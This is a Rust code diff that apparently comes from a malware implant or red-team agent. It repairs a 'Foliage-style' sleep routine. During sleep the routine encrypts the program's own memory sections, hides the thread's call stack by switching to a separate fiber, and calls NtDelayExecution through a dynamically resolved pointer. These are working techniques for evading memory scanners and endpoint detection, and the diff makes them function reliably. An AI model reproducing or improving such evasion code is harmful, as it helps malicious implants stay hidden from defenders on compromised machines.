@@ -67,17 +67,21 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
             info!("Initiating Foliage-style sleep for {:?}", duration);
             #[cfg(target_arch = "x86_64")]
             unsafe {
-                use std::ffi::c_void;
-                use winapi::shared::ntdef::{LARGE_INTEGER, NTSTATUS};
-                use winapi::um::synchapi::WaitForSingleObject;
-
                 // Foliage uses NtDelayExecution
 
                 crypto::encrypt_sections();
                 // Populate SLEEP_DURATION_NS before switching to the sleep fiber
                 // so the fiber knows how long to sleep (was always 0 before = no-op spoof).
                 spoof::SLEEP_DURATION_NS.with(|c| c.set(duration.as_nanos() as u64));
-                spoof::spoof_stack();
+                let fiber_switched = spoof::spoof_stack();
+                spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
+
+                if fiber_switched {
+                    // The sleep fiber already slept for the requested duration.
+                    let _ = spoof::restore_stack();
+                    crypto::decrypt_sections();
+                    return Ok(());
+                }
 
                 let duration_100ns = -(duration.as_nanos() as i64 / 100);
                 let mut delay = duration_100ns;
@@ -99,10 +103,12 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
                     let function: extern "system" fn(u8, *mut i64) -> i32 =
                         std::mem::transmute(addr);
                     function(0, &mut delay as *mut i64);
-                    spoof::restore_stack();
-                    spoof::SLEEP_DURATION_NS.with(|c| c.set(0));
-                    crypto::decrypt_sections();
+                } else {
+                    // Last-resort fallback if NtDelayExecution cannot be resolved.
+                    std::thread::sleep(duration);
                 } // close if !addr.is_null()
+
+                crypto::decrypt_sections();
             } // close unsafe
             #[cfg(not(target_arch = "x86_64"))]
             std::thread::sleep(duration);
@@ -488,16 +494,17 @@ pub mod spoof {
         pub(super) static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
             const { std::cell::Cell::new(std::ptr::null_mut()) };
         pub(super) static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
+        pub(super) static LAST_SWITCH_SUCCEEDED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
     }
 
     #[cfg(windows)]
-    pub fn spoof_stack() {
+    pub fn spoof_stack() -> bool {
         // Convert the current thread to a fiber so we can switch away from it.
         // This hides the current call stack during the sleep window.
         unsafe {
-            use winapi::um::winbase::{
-                ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
-            };
+            use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
+
+            LAST_SWITCH_SUCCEEDED.with(|c| c.set(false));
 
             // Only convert once per thread
             let main_fiber = MAIN_FIBER.with(|f| f.get());
@@ -513,7 +520,7 @@ pub mod spoof {
 
             if main_fiber.is_null() {
                 log::warn!("spoof_stack: ConvertThreadToFiber failed");
-                return;
+                return false;
             }
 
             // Create the sleep fiber if not yet created
@@ -547,7 +554,7 @@ pub mod spoof {
 
             if sleep_fiber.is_null() {
                 log::warn!("spoof_stack: CreateFiber failed");
-                return;
+                return false;
             }
 
             log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
@@ -555,21 +562,33 @@ pub mod spoof {
             // now hidden.  The sleep fiber will call Sleep() and then
             // SwitchToFiber(main_fiber), which resumes execution right here.
             SwitchToFiber(sleep_fiber);
+            LAST_SWITCH_SUCCEEDED.with(|c| c.set(true));
+            true
         }
     }
 
     #[cfg(windows)]
-    pub fn restore_stack() {
+    pub fn restore_stack() -> bool {
         // Switch back happens inside the sleep fiber proc automatically.
         // This function is a no-op since the fiber already returned control.
-        log::debug!("restore_stack: resumed from sleep fiber");
+        let switched = LAST_SWITCH_SUCCEEDED.with(|c| c.replace(false));
+        if switched {
+            log::debug!("restore_stack: resumed from sleep fiber");
+        } else {
+            log::debug!("restore_stack: no fiber switch to restore");
+        }
+        switched
     }
 
     #[cfg(not(windows))]
-    pub fn spoof_stack() {}
+    pub fn spoof_stack() -> bool {
+        false
+    }
 
     #[cfg(not(windows))]
-    pub fn restore_stack() {}
+    pub fn restore_stack() -> bool {
+        false
+    }
 }
 
 /// Release any fiber handles created by `spoof::spoof_stack` for the calling
